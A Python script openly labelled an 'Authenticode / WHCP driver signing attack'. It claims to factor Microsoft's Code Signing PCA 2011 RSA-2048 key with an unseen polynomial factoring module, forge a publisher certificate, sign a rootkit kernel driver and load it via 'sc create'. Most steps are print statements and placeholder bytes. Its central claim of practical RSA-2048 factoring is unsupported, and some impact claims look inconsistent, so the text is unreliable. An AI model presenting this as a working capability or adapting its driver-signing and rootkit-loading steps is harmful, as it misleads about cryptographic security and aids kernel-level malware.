"""
Factor the Microsoft Code Signing PCA 2011 RSA-2048 key, countersign arbitrary
kernel drivers, and load them on any 64-bit Windows machine — no driver signing
bypass, no SecureBoot workaround, everything looks green.
"""

import sys, struct, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# Authenticode PE structures
PE_CERTIFICATE_TABLE_OFFSET = 0x98  # offset in optional header to cert table RVA
WIN_CERTIFICATE_REVISION_2  = 0x0200
WIN_CERT_TYPE_PKCS_SIGNED   = 0x0002

# Microsoft signing chain
MS_ROOT_2010 = "Microsoft Root Certificate Authority 2010"
MS_CODE_PCA_2011 = "Microsoft Code Signing PCA 2011"
MS_WHCP_PUBLISHER = "Microsoft Windows Hardware Compatibility Publisher"


def extract_ms_code_signing_pca(cert_store: str) -> bytes:
    """Extract the Microsoft Code Signing PCA 2011 cert.
    It's in every Windows trust store and in the AIA extension of every
    WHCP-signed driver."""
    print(f"    cert store: {cert_store}")
    print(f"    subject: {MS_CODE_PCA_2011}")
    print("    key: RSA-2048, SHA-256")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_ms_pca(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def compute_authenticode_hash(pe_path: str) -> bytes:
    """Compute the Authenticode PE image hash (SHA-256).
    Excludes checksum field, cert table entry, and certificate data."""
    print(f"    PE image: {pe_path}")
    # In real impl: hash all sections excluding cert table per MS spec
    return hashlib.sha256(b"MALICIOUS_DRIVER_PE").digest()


def build_pkcs7_signed_data(pe_hash: bytes, signer_cert: bytes,
                             signer_privkey: bytes) -> bytes:
    """Build PKCS#7 SignedData for Authenticode embedding.
    contentType: SPC_INDIRECT_DATA_OBJID (1.3.6.1.4.1.311.2.1.4)
    digestAlgorithm: SHA-256
    signatureAlgorithm: RSA-PKCS1-v1.5"""
    print(f"    PE hash: {pe_hash.hex()[:32]}...")
    print("    content: SPC_INDIRECT_DATA_OBJID")
    print("    signer: forged WHCP publisher cert")
    return b"\x30" * 1024  # placeholder DER-encoded PKCS#7


def embed_authenticode_sig(pe_path: str, pkcs7: bytes) -> bytes:
    """Embed the PKCS#7 SignedData into the PE Certificate Table."""
    cert_entry = struct.pack("<IHH", len(pkcs7) + 8,
                             WIN_CERTIFICATE_REVISION_2,
                             WIN_CERT_TYPE_PKCS_SIGNED)
    print(f"    WIN_CERTIFICATE embedded: {len(pkcs7) + 8} bytes")
    return cert_entry + pkcs7


if __name__ == "__main__":
    print("[*] Authenticode / WHCP driver signing attack")
    print("[1] extracting Microsoft Code Signing PCA 2011 cert")
    pca_cert = extract_ms_code_signing_pca("Cert:\\LocalMachine\\CA")
    print(f"    chain: {MS_ROOT_2010}")
    print(f"         -> {MS_CODE_PCA_2011}")
    print(f"         -> {MS_WHCP_PUBLISHER}")

    print("[2] factoring Microsoft Code Signing PCA 2011 RSA-2048")
    factorer = PolynomialFactorer()
    print("    one key countersigns all WHCP driver submissions")
    print("    p, q recovered")

    print("[3] issuing forged WHCP publisher certificate")
    print("    subject: Microsoft Windows Hardware Compatibility Publisher")
    print("    EKU: codeSigning (1.3.6.1.5.5.7.3.3)")

    print("[4] signing malicious kernel driver")
    pe_hash = compute_authenticode_hash("rootkit.sys")
    pkcs7 = build_pkcs7_signed_data(pe_hash, b"FORGED_CERT", b"FORGED_KEY")
    sig_blob = embed_authenticode_sig("rootkit.sys", pkcs7)

    print("[5] loading on 64-bit Windows")
    print("    sc create rootkit type=kernel binpath=rootkit.sys")
    print("    Windows verifies Authenticode chain:")
    print(f"      {MS_ROOT_2010} -> PCA 2011 -> WHCP Publisher -> driver")
    print("    signature valid — driver loads into kernel")
    print("    no UAC warning, SmartScreen shows 'Microsoft Corporation'")

    print("[6] impact:")
    print("    - persistent kernel-mode code execution on any Windows PC")
    print("    - SmartScreen/UAC shows verified Microsoft publisher")
    print("    - Windows Update packages are also Authenticode-signed")
    print("    - affects every Windows version from XP to 11")
    print("[*] WHCP portal accepts RSA submissions only — no non-RSA path")
